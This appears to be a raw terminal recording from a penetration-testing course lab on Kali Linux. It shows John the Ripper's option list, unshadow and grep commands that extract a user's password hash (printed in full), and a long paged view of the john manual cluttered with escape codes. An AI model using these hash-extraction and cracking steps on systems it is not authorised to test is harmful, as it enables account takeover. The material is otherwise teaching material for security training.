+--prince[=FILE]            PRINCE mode, read words from FILE
+--encoding=NAME            input encoding (eg. UTF-8, ISO-8859-1). See also
+                           doc/ENCODINGS and --list=hidden-options.
+--rules[=SECTION[,..]]     enable word mangling rules (for wordlist or PRINCE
+                           modes), using default or named rules
+--rules=:rule[;..]]        same, using "immediate" rule(s)
+--rules-stack=SECTION[,..] stacked rules, applied after regular rules or to
+                           modes that otherwise don't support rules
+--rules-stack=:rule[;..]   same, using "immediate" rule(s)
+--incremental[=MODE]       "incremental" mode [using section MODE]
+--mask[=MASK]              mask mode using MASK (or default from john.conf)
+--markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)
+--external=MODE            external mode or word filter
+--subsets[=CHARSET]        "subsets" mode (see doc/SUBSETS)
+--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
+--restore[=NAME]           restore an interrupted session [called NAME]
+--session=NAME             give a new session the NAME
+--status[=NAME]            print status of a session [called NAME]
+--make-charset=FILE        make a charset file. It will be overwritten
+--show[=left]              show cracked passwords [if =left, then uncracked]
+--test[=TIME]              run tests and benchmarks for TIME seconds each
+--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
+--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
+--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
+--salts=[-]COUNT[:MAX]     load salts with[out] COUNT [to MAX] hashes
+--costs=[-]C[:M][,...]     load salts with[out] cost value Cn [to Mn]. For
+                           tunable cost parameters, see doc/OPTIONS
+--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
+--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
+--fork=N                   fork N processes
+--pot=NAME                 pot file to use
+--list=WHAT                list capabilities, see --list=help or doc/OPTIONS
+--format=NAME              force hash of type NAME. The supported formats can
+                           be seen with --list=formats and --list=subformats
+
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt | grep david | john [K[K[K[K[K>> [K[K pass_davide[K
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# ll
+totale 140
+-rw-r--r-- 1 root root   1418 nov 29 14:40 out_alice.txt
+-rw-r--r-- 1 root root      0 nov 29 15:02 pass_david
+-rw-r--r-- 1 root root   1904 nov 29 14:57 passwd
+-rw-r--r-- 1 root root     74 nov 29 14:11 password.txt
+-rw-r--r-- 1 root root   4897 nov 29 14:12 pwd_alice.txt
+-rw-r--r-- 1 root root 114688 nov 29 15:02 script.txt
+-rw-r--r-- 1 root root   1412 nov 29 14:51 shadow_s.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat pass_david 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat pass_david ll[Kunshadow passwd shadow_s.txt | grep david | > pass_david> pass_david
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt | grep david | >> pass_david[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat pass_david [K
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat pass_david unshadow passwd shadow_s.txt | grep david | >> pass_david[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:1503:1503::/home/david:/bin/sh
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow passwd shadow_s.txt | grep david >> pass_david 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# ll[K[Kcat pass_david 
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:1503:1503::/home/david:/bin/sh
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# man john 
+[?1049h[22;0;0t[?1h=JOHN(8)                                 System Manager's Manual                                JOHN(8)[m
+[m
+[1mNAME[0m[m
+       john - a tool to find weak passwords of your users[m
+[m
+[1mSYNOPSIS[0m[m
+       [1mjohn[0m [[4moptions[24m] password-files[m
+[m
+[1mDESCRIPTION[0m[m
+       This  manual page documents briefly the [1mjohn[0m command.  This manual page was written for the De‐[m
+       bian GNU/Linux distribution because the original program does not have a  manual  page.   [1mjohn[0m,[m
+       better  known  as  John the Ripper, is a tool to find weak passwords of users in a server. John[m
+       can use a dictionary or some search pattern as well as a password file to check for  passwords.[m
+       John  supports  different  cracking modes and understands many ciphertext formats, like several[m
+       DES variants, MD5 and blowfish. It can also be used to extract AFS and Windows NT passwords.[m
+[m
+[1mUSAGE[0m[m
+       To use John, you just need to supply it a password file and the desired options. If no mode  is[m
+       specified, john will try "single" first, then "wordlist" and finally "incremental".[m
+[m
+       Once  John  finds  a  password, it will be printed to the terminal and saved into a file called[m
+       ~/.john/john.pot. John will read this file when it restarts so it doesn't try to crack  already[m
+       done passwords.[m
+[m
+       To see the cracked passwords, use[m
+[m
+       john -show passwd[m
+[m
+       Important:  do  this  under  the  same directory where the password was cracked (when using the[m
+       cronjob, /var/lib/john), otherwise it won't work.[m
+[m
+       While cracking, you can press any key for status, or Ctrl+C to abort the session, saving  point[m
+       information  to  a  file  ( [4m~/.john/john.rec[24m by default). By the way, if you press Ctrl+C twice[m
+       John will abort immediately without saving.  The point information is also saved every 10  min‐[m
+       utes  (configurable  in the configuration file, [4m~/.john/john.ini[24m or [4m~/.john/john.conf[24m ) in case[m
+       of a crash.[m
+[m
+       To continue an interrupted session, run:[m
+[m
+       john -restore[m
+[m
+       Now, you may notice that many accounts have a disabled shell, you can make  John  ignore  these[m
+       (assume that shell is called [4m/etc/expired[24m ):[m
+[m
+       john -show -shells:-/etc/expired passwd[m
+[7m Manual page john(8) line 1 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 2 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       You  might  want to mail all the users who got weak passwords, to tell them to change the pass‐[m
+[7m Manual page john(8) line 3 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       words. It's not always a good idea though (unfortunately, lots of people seem  to  ignore  such[m
+[7m Manual page john(8) line 4 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       mail, it can be used as a hint for crackers, etc), but anyway, I'll assume you know what you're[m
+[7m Manual page john(8) line 5 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       doing. Get a copy of the 'mailer' script supplied with  John,  so  you  won't  change  anything[m
+[7m Manual page john(8) line 6 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       that's  under  [4m/usr/sbin[24m  ;  edit the message it sends, and possibly the mail command inside it[m
+[7m Manual page john(8) line 7 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       (especially if the password file is from a different box than you got John running  on).   Then[m
+[7m Manual page john(8) line 8 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       run:[m
+[7m Manual page john(8) line 9 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 10 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K        ./mailer passwd[m
+[7m Manual page john(8) line 11 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 12 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       Anyway,  you  probably  should have a look at [4m/usr/share/doc/john/OPTIONS[24m for a list of all the[m
+[7m Manual page john(8) line 13 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       command line options, and at [4m/usr/share/doc/john/EXAMPLES[24m for more  John  usage  examples  with[m
+[7m Manual page john(8) line 14 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       other cracking modes.[m
+[7m Manual page john(8) line 15 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 16 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mOPTIONS[0m[m
+[7m Manual page john(8) line 17 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       All the options recognized by john start with a single dash (`-').  A summary of options is in‐[m
+[7m Manual page john(8) line 18 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       cluded below.[m
+[7m Manual page john(8) line 19 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 20 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-external:MODE[0m[m
+[7m Manual page john(8) line 21 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Enables an external mode, using external functions defined in ~/john.ini's  [List.Exter‐[m
+[7m Manual page john(8) line 22 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              nal:MODE] section.[m
+[7m Manual page john(8) line 23 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 24 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-format:NAME[0m[m
+[7m Manual page john(8) line 25 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Allows  you  to  override the ciphertext format detection. Currently, valid format names[m
+[7m Manual page john(8) line 26 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              are DES, BSDI, MD5, BF, AFS, LM. You can use this option when cracking or with  '-test'.[m
+[7m Manual page john(8) line 27 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Note  that John can't crack password files with different ciphertext formats at the same[m
+[7m Manual page john(8) line 28 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              time.[m
+[7m Manual page john(8) line 29 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 30 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-groups:[-]GID[,..][0m[m
+[7m Manual page john(8) line 31 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Tells John to load users of the specified group(s) only.[m
+[7m Manual page john(8) line 32 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 33 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-incremental[:MODE][0m[m
+[7m Manual page john(8) line 34 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Enables the incremental mode, using the specified ~/john.ini definition (section [Incre‐[m
+[7m Manual page john(8) line 35 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              mental:MODE], or [Incremental:All] by default).[m
+[7m Manual page john(8) line 36 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 37 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-makechars:FILE[0m[m
+[7m Manual page john(8) line 38 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Generates  a charset file, based on character frequencies from ~/.john/john.pot, for use[m
+[7m Manual page john(8) line 39 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              with the incremental mode. The entire ~/.john/john.pot will be used for the charset file[m
+[7m Manual page john(8) line 40 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              unless  you  specify  some password files. You can also use an external filter() routine[m
+[7m Manual page john(8) line 41 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              with this option.[m
+[7m Manual page john(8) line 42 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 43 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-restore[:FILE][0m[m
+[7m Manual page john(8) line 44 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Continues an interrupted cracking session, reading point information from the  specified[m
+[7m Manual page john(8) line 45 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              file (~/.john/john.rec by default).[m
+[7m Manual page john(8) line 46 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 47 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-rules[0m Enables  wordlist rules, that are read from [List.Rules:Wordlist] in [4m/etc/john/john.conf[24m[m
+[7m Manual page john(8) line 48 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              (or the alternative configuration file you might specify on the command line).[m
+[7m Manual page john(8) line 49 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              This option [1mrequires[0m the [1m-wordlist[0m option to be passed as well.[m
+[7m Manual page john(8) line 50 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 51 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-salts:[-]COUNT[0m[m
+[7m Manual page john(8) line 52 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              This feature sometimes allows you to achieve better performance.  For  example  you  can[m
+[7m Manual page john(8) line 53 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              crack  only  some  salts  using  '-salts:2'  faster,  and  then  crack  the  rest  using[m
+[7m Manual page john(8) line 54 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              '-salts:-2'. Total cracking time will be about the same, but you will get some passwords[m
+[7m Manual page john(8) line 55 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              cracked earlier.[m
+[7m Manual page john(8) line 56 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 57 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-savemem:LEVEL[0m[m
+[7m Manual page john(8) line 58 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              You might need this option if you don't have enough memory, or don't want John to affect[m
+[7m Manual page john(8) line 59 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              other processes too much. Level 1 tells John not to waste memory on login names, so  you[m
+[7m Manual page john(8) line 60 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              won't see them while cracking. Higher levels have a performance impact: you should prob‐[m
+[7m Manual page john(8) line 61 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              ably avoid using them unless John doesn't work or gets into swap otherwise.[m
+[7m Manual page john(8) line 62 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 63 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-session:FILE[0m[m
+[7m Manual page john(8) line 64 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Allows you to specify another point information file's name to  use  for  this  cracking[m
+[7m Manual page john(8) line 65 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              session.  This  is useful for running multiple instances of John in parallel, or just to[m
+[7m Manual page john(8) line 66 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              be able to recover an older session later, not always continue the latest one.[m
+[7m Manual page john(8) line 67 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 68 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-shells:[-]SHELL[,..][0m[m
+[7m Manual page john(8) line 69 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              This option is useful to load accounts with a valid shell only, or not to load  accounts[m
+[7m Manual page john(8) line 70 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              with a bad shell. You can omit the path before a shell name, so '-shells:csh' will match[m
+[7m Manual page john(8) line 71 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              both '/bin/csh' and '/usr/bin/csh', while ´-shells:/bin/csh' will only match '/bin/csh'.[m
+[7m Manual page john(8) line 72 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 73 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-show[0m  Shows the cracked passwords in a convenient form. You should also specify  the  password[m
+[7m Manual page john(8) line 74 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              files.  You  can  use  this option while another John is cracking, to see what it did so[m
+[7m Manual page john(8) line 75 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              far.[m
+[7m Manual page john(8) line 76 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 77 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-single[0m[m
+[7m Manual page john(8) line 78 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Enables the "single crack" mode, using rules from [List.Rules:Single].[m
+[7m Manual page john(8) line 79 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 80 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-status[:FILE][0m[m
+[7m Manual page john(8) line 81 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Prints status of an interrupted or running session. To get an up to date status informa‐[m
+[7m Manual page john(8) line 82 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              tion  of  a  detached running session, send that copy of John a SIGHUP before using this[m
+[7m Manual page john(8) line 83 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              option.[m
+[7m Manual page john(8) line 84 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 85 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-stdin[0m These are used to enable the wordlist mode (reading from stdin).[m
+[7m Manual page john(8) line 86 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 87 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-stdout[:LENGTH][0m[m
+[7m Manual page john(8) line 88 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              When used with a cracking mode, except for "single crack", makes John print the words it[m
+[7m Manual page john(8) line 89 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              generates  to stdout instead of cracking. While applying wordlist rules, the significant[m
+[7m Manual page john(8) line 90 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              password length is assumed to be LENGTH, or unlimited by default.[m
+[7m Manual page john(8) line 91 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 92 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-test[0m  Benchmarks all the enabled ciphertext format crackers, and tests them for correct opera‐[m
+[7m Manual page john(8) line 93 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              tion at the same time.[m
+[7m Manual page john(8) line 94 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              This option does [1mnot[0m need any file passed as argument. Its only function is to benchmark[m
+[7m Manual page john(8) line 95 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              the system john is running on.[m
+[7m Manual page john(8) line 96 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 97 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-users:[-]LOGIN|UID[,..][0m[m
+[7m Manual page john(8) line 98 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              Allows you to filter a few accounts for cracking, etc. A dash before  the  list  can  be[m
+[7m Manual page john(8) line 99 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              used to invert the check (that is, load all the users that aren't listed).[m
+[7m Manual page john(8) line 100 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 101 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1m-wordlist:FILE[0m[m
+[7m Manual page john(8) line 102 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              These are used to enable the wordlist mode, reading words from FILE.[m
+[7m Manual page john(8) line 103 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 104 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mMODES[0m[m
+[7m Manual page john(8) line 105 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       John can work in the following modes:[m
+[7m Manual page john(8) line 106 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 107 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mWordlist[0m[m
+[7m Manual page john(8) line 108 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              John  will simply use a file with a list of words that will be checked against the pass‐[m
+[7m Manual page john(8) line 109 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              words. See RULES for the format of wordlist files.[m
+[7m Manual page john(8) line 110 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 111 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mSingle[0m [1mcrack[0m[m
+[7m Manual page john(8) line 112 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              In this mode, john will try to crack the password using the login/GECOS  information  as[m
+[7m Manual page john(8) line 113 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              passwords.[m
+[7m Manual page john(8) line 114 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 115 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mIncremental[0m[m
+[7m Manual page john(8) line 116 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              This  is  the most powerful mode. John will try any character combination to resolve the[m
+[7m Manual page john(8) line 117 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              password.  Details about these modes can be found in the MODES file in john's documenta‐[m
+[7m Manual page john(8) line 118 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              tion, including how to define your own cracking methods.[m
+[7m Manual page john(8) line 119 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 120 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mFILES[0m[m
+[7m Manual page john(8) line 121 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [4m/etc/john/john.conf[24m[m
+[7m Manual page john(8) line 122 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              is where you configure how john will behave.[m
+[7m Manual page john(8) line 123 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 124 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [4m/etc/john/john-mail.msg[24m[m
+[7m Manual page john(8) line 125 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              has the message sent to users when their passwords are successfully cracked.[m
+[7m Manual page john(8) line 126 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 127 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [4m/etc/john/john-mail.conf[24m[m
+[7m Manual page john(8) line 128 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              is  used  to  configure  how  john  will send messages to users that had their passwords[m
+[7m Manual page john(8) line 129 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K              cracked.[m
+[7m Manual page john(8) line 130 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 131 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mSEE[0m [1mALSO[0m[m
+[7m Manual page john(8) line 132 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mmailer[0m(8), [1munafs[0m(8), [1munique[0m(8), [1munshadow[0m(8),[m
+[7m Manual page john(8) line 133 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 134 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       The programs and the configuration files are documented fully by  John's  documentation,  which[m
+[7m Manual page john(8) line 135 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       should be available in [4m/usr/share/doc/john[24m or other location, depending on your system.[m
+[7m Manual page john(8) line 136 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 137 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mAUTHOR[0m[m
+[7m Manual page john(8) line 138 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       This manual page was written by Jordi Mallach <jordi@debian.org> and Jeronimo  Pellegrini <pel‐[m
+[7m Manual page john(8) line 139 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       legrini@mpcnet.com.br>, for the Debian GNU/Linux system (but may be used by others).[m
+[7m Manual page john(8) line 140 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       John the Ripper was written by Solar Designer <solar@openwall.com>.  The complete list of  con‐[m
+[7m Manual page john(8) line 141 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       tributors can be found in the CREDITS file in the documentation directory.[m
+[7m Manual page john(8) line 142 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page john(8) line 143 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[Kjohn                                         June 09, 2008                                     JOHN(8)[m
+[7m Manual page john(8) line 144 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page john(8) line 144/188 (END) (press h for help or q to quit)[27m[K[K 